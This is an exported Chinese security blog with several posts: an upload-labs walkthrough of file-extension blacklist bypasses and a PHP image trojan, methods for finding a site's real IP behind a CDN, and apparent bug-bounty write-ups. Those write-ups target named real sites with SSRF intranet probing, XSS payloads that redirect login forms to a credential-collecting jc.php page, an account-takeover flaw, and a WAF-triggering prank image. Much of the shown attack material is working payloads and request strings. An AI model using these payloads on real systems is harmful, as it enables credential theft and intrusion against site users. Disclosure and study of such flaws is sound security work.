第四关这一关坏得很，因为他把全部后缀都加入黑名单了，代码如下 1$is_upload = false;2$msg = null;3if (isset($_POST['submit'])) &#123;4 if (file_exists(UPLOAD_PATH)) &#123;5 $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\");6 $file_name = trim($_FILES['upload_file']['name']);7 $file_name = deldot($file_name);//删除文件名末尾的点8 $file_ext = strrchr($file_name, '.');9 $file_ext = strtolower($file_ext); //转换为小写10 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA11 $file_ext = trim($file_ext); //收尾去空1213 if (!in_array($file_ext, $deny_ext)) &#123;14 $temp_file = $_FILES['upload_file']['tmp_name'];15 $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;16 if (move_uploaded_file($temp_file, $img_path)) &#123;17 $is_upload = true;18 &#125; else &#123;19 $msg = '上传出错！';20 &#125;21 &#125; else &#123;22 $msg = '此文件不允许上传!';23 &#125;24 &#125; else &#123;25 $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';26 &#125;27&#125; 可以看到限制了很多后缀，但是我们可以上传.htaccess文件，然后在里面写 1SetHandler application&#x2F;x-httpd-php 这个意思是把这个目录的所以文件当php解析，但是这个也是有环境限制的，只能在apache用，因为.htaccess是apache的配置文件 第五关这一关代码如下 1$is_upload = false;2$msg = null;3if (isset($_POST['submit'])) &#123;4 if (file_exists(UPLOAD_PATH)) &#123;5 $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");6 $file_name = trim($_FILES['upload_file']['name']);7 $file_name = deldot($file_name);//删除文件名末尾的点8 $file_ext = strrchr($file_name, '.');9 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA10 $file_ext = trim($file_ext); //首尾去空1112 if (!in_array($file_ext, $deny_ext)) &#123;13 $temp_file = $_FILES['upload_file']['tmp_name'];14 $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;15 if (move_uploaded_file($temp_file, $img_path)) &#123;16 $is_upload = true;17 &#125; else &#123;18 $msg = '上传出错！';19 &#125;20 &#125; else &#123;21 $msg = '此文件类型不允许上传！';22 &#125;23 &#125; else &#123;24 $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';25 &#125;26&#125; 这一段大概意思就是上传的文件后缀名不允许出现在$deny_ext里，但是我们可以通过上传Php来绕过~ 他这里限制了php不能上传 但是并没有将其全转换成小写 所以可以用大写绕过 第六关 这一关也是黑名单策略，然后把.htaccess文件也限制了，但是我们可以用php空格绕过，如下 第七关 这一关还是黑名单策略，因为这里没有把.删除，所以可以上传.php.绕过（原理是window会把文件后缀后面的.删除，比如上传1.php....会变成1.php这是window的特性） 第八关 还是黑名单，但是我们还是可以利用window的特性绕过，上传一个.php::$DATA后缀类型，上传后会变成.php 第九关 还是黑名单策略，但是我们可以利用only_free.php. .来绕过，因为第7行会删除末尾的点就变成了only_free.php.空格，然后第11行会把后面的空格去掉，就变成了only_free.php.然后经过window的特性，会变成only_free.php，如图 第十关 先看到第8行，代码意思是：把$file_name中的$deny_ext替换为空，意思就是如果我上传的文件名是1.php而php在$deny_ext列表里，然后就会把php替换为空，变成1.，但是这里有个逻辑缺陷。如上传一个1.pphphp他会把php去掉，如图，然后就变成了1.php成功绕过，如图 第十一关暂空 第十二关暂空 第十三关这一关比较奇特，不用上传php文件，只要能成功上传图片即可，而上传图片的前提是这个图片必须为图片马，何为图片马呢？ 就是一个能正常显示，但是图片本身是带有恶意的代码的，详细可看如下链接 http://gv7.me/articles/2017/picture-trojan-horse-making-method/ 这里上传的话上传一个only_free.jpg，然后内容是 1GIF98a2&lt;?php34phpinfo();56?&gt; GIF98a是图片头，这样子表示这个是GIF图片，然后看上传结果 第十四关 看到这里的第四行是获取$filename的图片类型，依旧可以用GIF98a来绕过","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"获取真实IP方法【绕过CDN】","slug":"获取真实IP方法【绕过CDN】","date":"2018-12-18T01:11:53.000Z","updated":"2019-12-18T01:13:08.036Z","comments":true,"path":"2018/12/18/获取真实IP方法【绕过CDN】/","link":"","permalink":"http://yoursite.com/2018/12/18/%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9EIP%E6%96%B9%E6%B3%95%E3%80%90%E7%BB%95%E8%BF%87CDN%E3%80%91/","excerpt":"","text":"现在很多网站都有CDN（CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度）。 所以有CDN我们就无法直接看到目标网站的真实IP~ 为什么要知道真实IP在渗透中，很多恶意请求都会被CDN拦截掉，这个叫云WAF，那么我们可以直接去请求他的真实IP，而不经过他的CDN处理，就可以直接目标服务器的WAF 多PING验证是否开启了CDN有很多种办法，比如多地点PING测试，因为目标地址如果开启了CDN的话那么每个地方去PING的地址都会不同（CDN就是加快网站访问速度，所以每个地点都会有CDN的节点，所以每个地点的CDN服务器不同，ip也就不同） 多ping测试网站：http://tool.chinaz.com/speedtest/ 还有这二个 http://ping.aizhan.com/http://ce.cloud.360.cn/ 利用第三方工具检测是否是使用CDNhttps://www.ipip.net/ip.html 对比开放的WAF IP开放的WAF IP 1103.21.244.0&#x2F;222103.22.200.0&#x2F;223103.31.4.0&#x2F;224104.16.0.0&#x2F;125108.162.192.0&#x2F;186131.0.72.0&#x2F;227141.101.64.0&#x2F;188162.158.0.0&#x2F;159172.64.0.0&#x2F;1310173.245.48.0&#x2F;2011188.114.96.0&#x2F;2012190.93.240.0&#x2F;2013197.234.240.0&#x2F;2214198.41.128.0&#x2F;1715199.83.128.0&#x2F;2116198.143.32.0&#x2F;1917149.126.72.0&#x2F;2118103.28.248.0&#x2F;221945.64.64.0&#x2F;2220185.11.124.0&#x2F;2221192.230.64.0&#x2F;1822107.154.0.0&#x2F;162345.60.0.0&#x2F;162445.223.0.0&#x2F;16 然后用nslookup 域名来查询解析的IP，然后去对比开放的WAF IP，如果在里面的话就忽略掉 1nslookup xxx.xxx.com nslookup用法 https://blog.csdn.net/violet_echo_0908/article/details/52033725 还有验证是否有CDN也可以用nslookup，也就是解析的ip都不同 利用漏洞知道真实IP如SSRF漏洞，可直接探测到目标服务器的内网，还有比如有些站泄露了phpinfo那么也可以看到真实的ip地址，还有一些就是社工站长这些了~ 看子域名的解析IP很多站长都只会在主站上挂CDN，导致我们可以去看子域名的ip（大部分原因都是因为CDN贵，所以只有主站才挂着~） 看历史解析IP查询域名历史DNS解析，网上有很多站点都可以查询站点的历史DNS解析，列举如下几个链接 https://viewdns.info/http://site.ip138.com/https://securitytrails.com/ 比如对方服务器xx时候没有挂CDN然后那个时候正好有历史ip解析 利用国外服务器查很多国内厂商只对国内的路线才有CDN服务器，国外没有，所以用国外的服务器去看的话就直接是目标服务器的真实IP","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据","slug":"某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据","date":"2018-12-18T00:14:26.000Z","updated":"2019-12-18T00:28:14.636Z","comments":true,"path":"2018/12/18/某厂因登录处利用GET请求传递的参数而造成可劫持登录凭据/","link":"","permalink":"http://yoursite.com/2018/12/18/%E6%9F%90%E5%8E%82%E5%9B%A0%E7%99%BB%E5%BD%95%E5%A4%84%E5%88%A9%E7%94%A8GET%E8%AF%B7%E6%B1%82%E4%BC%A0%E9%80%92%E7%9A%84%E5%8F%82%E6%95%B0%E8%80%8C%E9%80%A0%E6%88%90%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/","excerpt":"","text":"漏洞挖于18年，在其他平台发布过，都是原创。1、打开url：http://xxx.xxx.com/contact/portal/pim/index.shtml 2、点击登陆，并且抓包，抓取的数据包如下 1GET &#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;https%3A%2F%2Ftongbu.xxx.com%2Fcontact%2Fcontact%2Fportal%2FinitSession&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D; HTTP&#x2F;1.12Host: xxx.xxx.xxx3User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; rv:36.0) Gecko&#x2F;20100101 Firefox&#x2F;36.044Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.85Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7DNT: 18Referer: http:&#x2F;&#x2F;xxxxx.xxx&#x2F;9Cookie: 10Connection: close 注意数据包里的xx.cb，我们将其修改为http://127.0.0.1/jc.php jc.php文件的代码是： 1&lt;?php2&#x2F;&#x2F; 因为是演示，所以单纯只是打印，而不是将其存储至数据库3echo &quot;&lt;pre&gt;&quot;;4var_dump( $_GET );5?&gt; 修改后的url为: 1https:&#x2F;&#x2F;passport.xxx.com&#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D; 放包，会来到登陆页面 3、输入正确的密码，并且点击登陆 成功的获取了用户的登陆凭证 4、修改为登陆凭据 1https:&#x2F;&#x2F;tongbu.xxx.com&#x2F;contact&#x2F;contact&#x2F;portal&#x2F;initSession?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.wust&#x3D;ZAgAAAAAAAGE9MTAxMjM5MjQ3MDkmYj0xJmM9NCZkPTEwMTIxJmU9ODcxRUNDMTA4N0M4MzhGNzU1QjhGOUJFRjUxRkQzMDMxJmg9MTUzMTcxMDE4NzUwMCZpPTQzMjAwJmlsPWNuJnVzZXJuYW1lPTE1MTE5MzMwMzc2yFbCIH3Sep4W5Ye4v27TQw&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.lang&#x3D;zh_CN&amp;xx.vp&#x3D; 成功的访问，那么利用的话是很简单的，只需要将如下url发送给用户： 1https:&#x2F;&#x2F;passport.xxx.com&#x2F;wauthen&#x2F;login?xx.action&#x3D;uilogin&amp;xx.realm&#x3D;cloud.lps.xxx.com&amp;xx.uinfo&#x3D;username,nickname,pid&amp;xx.lang&#x3D;zh_CN&amp;xx.ctx&#x3D;aHR0cDovL3RvbmdidS5sZW5vdm8uY29tL2NvbnRhY3QvY29udGFjdC9wb3J0YWwvaG9tZS5odG1s&amp;xx.cb&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&amp;xx.source&#x3D;tongbu.xxx.com&amp;display&#x3D; 用户打开后，输入账号和密码我们就可以成功的获取用户的登陆凭据（假设127.0.0.1是域名，假设jc.php是将get请求的所有数据保存到数据库了）","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"猫眼头像上传处存在ssrf","slug":"猫眼头像上传处存在ssrf","date":"2018-12-13T03:51:49.000Z","updated":"2019-12-31T03:53:01.827Z","comments":true,"path":"2018/12/13/猫眼头像上传处存在ssrf/","link":"","permalink":"http://yoursite.com/2018/12/13/%E7%8C%AB%E7%9C%BC%E5%A4%B4%E5%83%8F%E4%B8%8A%E4%BC%A0%E5%A4%84%E5%AD%98%E5%9C%A8ssrf/","excerpt":"","text":"1、打开Url：http://maoyan.com/profile，然后选择一个图片上传然后抓包发现有如下请求 然后我猜想这里的处理流程是这样的： 上传文件后返回包返回一个Url 然后上图那个请求把一部的Url去访问并且使其成为图片地址（应该是读取Url然后把它内容写入~） 那么以上流程如果Url没有严格过滤的话是会造成SSRF的，然后发现可以用如下绕过~ 1http:&#x2F;&#x2F;p1.meituan.net.xxxxxxxxxxxxxxxx.xxxxxxxxxxxx 然后去我的CEYE去看下~ 可以看到他这里是有去请求的，那么还可以利用CEYE的DNS Rebinding使其去访问一个ip（比较麻烦），所以这里用另一种方法来使其访问随意一个ip 1http:&#x2F;&#x2F;p1.meituan.net.183.232.231.172.xip.io&#x2F; 这里的183.232.231.172是我ping百度的ip，然后我打开一下看看~ 然后放入请求中是可以正常访问的，如图 那么再测试一个无法访问的ip试试 可以看到返回的是504而且请求时间非常的长~ 那么来探测一下内网 127.0.0.1没开放192.168.0.1开放~","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"英才网登陆处设计缺陷可劫持用户登录凭据","slug":"英才网登陆处设计缺陷可劫持用户登录凭据","date":"2018-10-02T04:05:53.000Z","updated":"2019-12-31T04:19:38.794Z","comments":true,"path":"2018/10/02/英才网登陆处设计缺陷可劫持用户登录凭据/","link":"","permalink":"http://yoursite.com/2018/10/02/%E8%8B%B1%E6%89%8D%E7%BD%91%E7%99%BB%E9%99%86%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/","excerpt":"","text":"1、打开Url：http://passport.chinahr.com/qy/buser/login?backUrl=&quot;&gt;&lt;img src=x onerror=alert(1)&gt; 2、构造思路来深入利用 可以看到这里是可以执行js代码的，那么我这里就有一个骚思路了，就是能否把这个表单提交到我们自定义的页面呢，这样子我们就可以获取到用户登录的账号和密码了~ 3、构造利用的poc 我们都知道提交表单是用html的form来提交的，那么我们来构造把~，如下 1http:&#x2F;&#x2F;passport.chinahr.com&#x2F;qy&#x2F;buser&#x2F;login?backUrl&#x3D;1&quot;&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&quot; method&#x3D;&quot;POST&quot;&gt; 其中，jc.php页面的代码为 1&lt;?php23echo &quot;&lt;pre&gt;&quot;;4var_dump( $_POST ); &#x2F;&#x2F;打印出页面提交过来的post数据56?&gt; 4、打开poc链接 1http:&#x2F;&#x2F;passport.chinahr.com&#x2F;qy&#x2F;buser&#x2F;login?backUrl&#x3D;1&quot;&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&quot; method&#x3D;&quot;POST&quot;&gt; 这里有一个&quot;&gt;，为了让用户不起疑心我们来把这个闭合了，重新构造的poc如下 1http:&#x2F;&#x2F;passport.chinahr.com&#x2F;qy&#x2F;buser&#x2F;login?backUrl&#x3D;1&quot;&gt;&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;jc.php&quot; method&#x3D;&quot;POST&quot;&gt;&lt;p id&#x3D;&quot; 然后随便输入一下，点击提交 然后假设我这个jc.php是后台获取的，然后会把每次的post数据保存到数据库，然后再自动跳转到首页。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"英才网某处设计缺陷导致任意用户注册以及任意用户重置以及任意用户登录","slug":"英才网某处设计缺陷导致任意用户注册以及任意用户重置以及任意用户登录","date":"2018-10-01T04:05:53.000Z","updated":"2019-12-31T04:16:46.064Z","comments":true,"path":"2018/10/01/英才网某处设计缺陷导致任意用户注册以及任意用户重置以及任意用户登录/","link":"","permalink":"http://yoursite.com/2018/10/01/%E8%8B%B1%E6%89%8D%E7%BD%91%E6%9F%90%E5%A4%84%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C%E4%BB%A5%E5%8F%8A%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E9%87%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/","excerpt":"","text":"利用fuzz大法导致的任意用户重置&amp;注册1、打开Url：http://mym.chinahr.com/account/ 点击修改邮箱的时候，会发起一个请求 1mym.chinahr.com&#x2F;account&#x2F;updateMail?email&#x3D;only_free%40qq.com 这里我手贱的修改了为如下的Url 1http:&#x2F;&#x2F;mym.chinahr.com&#x2F;account&#x2F;updatePhone?mobile&#x3D;2333333 果然，傻人有傻福，居然成功了，那么任意用户注册和任意用户重置就简单了 任意用户注册复现步骤现在我有2个账号，如下 账号A 账号B 17777777777 18888888888 首先我登陆用手机号码17777777777然后把手机号码修改为18888888888，如下 然后我现在再用17777777777注册一个号然后再把手机号码改成13688888888，那么就可以导致用户注册了，具体步骤如下 登陆A账号修改手机号码为xxxx1 -&gt; 然后A账号会变没 -&gt; 然后再用A账号原先绑定的手机号码注册一个用户 -&gt; 再次修改为其他手机号码 -&gt; A账号又变没 ，依次类推就可以任意用户重置了，而这个写脚本也可以实现的（神通广大的审核大大一定知道的我就不多说了） 任意用户重置复现步骤 我想重置一18888888888这个手机号码的用户，我思路是这样的，如下： 首先我拿手机号为17777777777的那个号把手机号码修改为18888888888(访问http://mym.chinahr.com/account/updatePhone?mobile=18888888888)，然后这个时候17777777777就变成空，然后我再登陆18888888888的账号，把手机号码修改为18888888888，然后18888888888这个账号就不存在了 1、登陆17777777777，手机号码修改为18888888888 点击Execute会访问这个Url，然后手机号码会成功被修改，如下 2、这个时候再把手机号码修改为1 3、测试一下手机号码是否不存在了 任意用户登录复现步骤其实这个洞不是直接登陆的，而是有一定的利用过程，如下 假设17777777777是我的攻击目标，并且他这里没有绑定邮箱、微信这些 然后我通过登陆18888888888后把手机号码修改为17777777777（访问：http://mym.chinahr.com/account/updatePhone?mobile=17777777777） ok，然后18888888888的手机号码就变成17777777777那个账号了 然后这个时候我们来绑定一下微信和邮箱，如下 然后用户发现登陆密码不对了修改完密码后，我还是可以通过微信或者qq邮箱来登陆&amp;找回他密码，也算一个任意登陆了","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"灵犀登陆处可劫持用户登录凭据","slug":"灵犀登陆处可劫持用户登录凭据","date":"2018-09-13T04:05:53.000Z","updated":"2019-12-31T04:09:05.634Z","comments":true,"path":"2018/09/13/灵犀登陆处可劫持用户登录凭据/","link":"","permalink":"http://yoursite.com/2018/09/13/%E7%81%B5%E7%8A%80%E7%99%BB%E9%99%86%E5%A4%84%E5%8F%AF%E5%8A%AB%E6%8C%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E5%87%AD%E6%8D%AE/","excerpt":"","text":"1、打开Url：http://lingxi.baidu.com/login/?fromu=http://lingxi.baidu.com&amp;appid=336&amp;u=http://lingxi.baidu.com/#/ 2、登陆后报错页面会跳转到这样的Url 1http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;login&#x2F;?fromu&#x3D;http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;&amp;e&#x3D;ç¨æ·åå¯ç éè¯¯&amp;un&#x3D;admin&amp;aid&#x3D;336&amp;errno&#x3D;132#&#x2F; 然后将其修改为 1http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;login&#x2F;?fromu&#x3D;http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;&amp;e&#x3D;%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&amp;un&#x3D;admin&amp;aid&#x3D;336&amp;errno&#x3D;132#&#x2F; 可以看到将其url编码，可以解析html代码，然后我有个想法，看看能不能把登陆的信息提交到我自定义的页面(因为这里有httponly所以无法获取到cookie,所以可以利用这个办法来获取用户的账号和密码来登入用户的账号)。 3、高危化利用，构造为如下Url 1http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;login&#x2F;?fromu&#x3D;http:&#x2F;&#x2F;lingxi.baidu.com&#x2F;&amp;e&#x3D;%3Csvg%2fonload%3D%22var%20form1%20%3D%20document.getElementById%28%27uclogin%27%29%3Bform1.action%20%3D%20%27http%3A%2f%2f127.0.0.1%2fjc.php%27%3B%22%3E&amp;aid&#x3D;336&amp;errno&#x3D;132#&#x2F; 然后jc.php的代码是 1&lt;?php23echo &quot;&lt;pre&gt;&quot;;4var_dump( $_REQUEST ); 然后我们尝试一下登陆，随便输入内容后然后点击立即登陆","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"猎豹广告fuzz参数导致任意邮箱绑定","slug":"猎豹广告fuzz参数导致任意邮箱绑定","date":"2018-08-08T04:05:53.000Z","updated":"2019-12-31T04:21:35.377Z","comments":true,"path":"2018/08/08/猎豹广告fuzz参数导致任意邮箱绑定/","link":"","permalink":"http://yoursite.com/2018/08/08/%E7%8C%8E%E8%B1%B9%E5%B9%BF%E5%91%8Afuzz%E5%8F%82%E6%95%B0%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E9%82%AE%E7%AE%B1%E7%BB%91%E5%AE%9A/","excerpt":"","text":"1、打开Url：https://ori.cmcm.com/user/index.html 2、点击保存并且抓包，抓取的数据包如下 1POST &#x2F;user&#x2F;updateoneruserinfo.html HTTP&#x2F;1.12Host: ori.cmcm.com3User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2227.0 Safari&#x2F;537.364Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.015Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7DNT: 18Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-89X-Requested-With: XMLHttpRequest10Referer: https:&#x2F;&#x2F;ori.cmcm.com&#x2F;user&#x2F;index.html11Content-Length: 13412Cookie: 这是一个马赛克13Connection: close1415skype&#x3D;soory%2Cnull&amp;timezone&#x3D;Asia%2FShanghai&amp;country&#x3D;CN&amp;surname&#x3D;free&amp;name&#x3D;only&amp;cm_token&#x3D;ec622cd7baffb66839d657bd39d563c3211533098840827 然后来fuzz一下，加上email参数后，数据包如下 1POST &#x2F;user&#x2F;updateoneruserinfo.html HTTP&#x2F;1.12Host: ori.cmcm.com3User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;41.0.2227.0 Safari&#x2F;537.364Accept: application&#x2F;json, text&#x2F;javascript, *&#x2F;*; q&#x3D;0.015Accept-Language: zh-CN,zh;q&#x3D;0.8,en-US;q&#x3D;0.5,en;q&#x3D;0.36Accept-Encoding: gzip, deflate7DNT: 18Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-89X-Requested-With: XMLHttpRequest10Referer: https:&#x2F;&#x2F;ori.cmcm.com&#x2F;user&#x2F;index.html11Content-Length: 13412Cookie: 这是马赛克13Connection: close1415skype&#x3D;soory%2Cnull&amp;timezone&#x3D;Asia%2FShanghai&amp;country&#x3D;CN&amp;surname&#x3D;free&amp;name&#x3D;only&amp;cm_token&#x3D;ec622cd7baffb66839d657bd39d563c3211533098840827&amp;email&#x3D;only_free@qq.com ok，这里存在任意邮箱绑定，那么我们来绑定一个存在的用户的邮箱来尝试下看看能不能修改存在邮箱的账号 3、注册一个邮箱账号 注册好后登陆进去 4、在2017614104@qq.com的账号处吧邮箱改成1900065568@qq.com 我去，这里有过滤。。 来试试看看能不能绕过 好吧，绕不过，难受了，只能当任意邮箱绑定提交了（泪奔.png）","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"一个有趣的恶作剧","slug":"一个有趣的恶作剧","date":"2018-07-22T04:05:53.000Z","updated":"2019-12-31T04:06:18.651Z","comments":true,"path":"2018/07/22/一个有趣的恶作剧/","link":"","permalink":"http://yoursite.com/2018/07/22/%E4%B8%80%E4%B8%AA%E6%9C%89%E8%B6%A3%E7%9A%84%E6%81%B6%E4%BD%9C%E5%89%A7/","excerpt":"","text":"首先，正常打开I春秋页面（https://bbs.ichunqiu.com/portal.php） 然后手贱一下加上一个alert(1)试试~（https://bbs.ichunqiu.com/portal.ph p?a=alert(1)） 尝试利用我去=v=。这个WAF（加速乐）很强，这都给拦了，但是作为一个捡漏洞的人来讲，要别人交互的漏洞都是低位和不收的，而且这个是要用户打开链接才可以被拦截，但是等下就会正常显示，那用户点击后发现会显示这个页面不可能再次点击把，那么就应该想想如何提升危害，然后我发现了有个好玩的 构造代码首先我在本地尝试一下，创建一个HTML文件，代码是 1&lt;!DOCTYPE html&gt;2&lt;html lang=\"en\"&gt;3&lt;head&gt;4 &lt;meta charset=\"UTF-8\"&gt;5 &lt;title&gt;拦截吧（你打不开i春秋了）&lt;/title&gt;6&lt;/head&gt;7&lt;body&gt;8 &lt;img src=\"https://bbs.ichunqiu.com/portal.php?a=alert(1)\" alt=\"\"&gt;9&lt;/body&gt;10&lt;/html&gt; 然后在浏览器处打开 然后再尝试打开I春秋 我来解释一下为啥子~因为img标签设置的src属性是https://bbs.ichunqiu.com/portal.php?a=alert(1)，所以打开页面会加载https://bbs.ichunqiu.com/portal.php?a=alert(1)这个URL，然后我们访问这个URL的话会被WAF拦截，导致无法访问I春秋 利用我们可以看到I春秋回复处可以加载图片，如下（随便打开一个文章：https://bbs.ichunqiu.com/thread-46084-1-1.html） 上传的图片是：https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle 那么我想让别人访问这个文章就显示WAF拦截页面如何搞？ 嘿嘿，可以在链接后面加个&amp;a=alert(1)，变成https://bbs.ichunqiu.com/uc_server/avatar.php?uid=340720&amp;size=middle&amp;a=alert(1) 注意：先发一条评论然后点击编辑然后插入这段代码 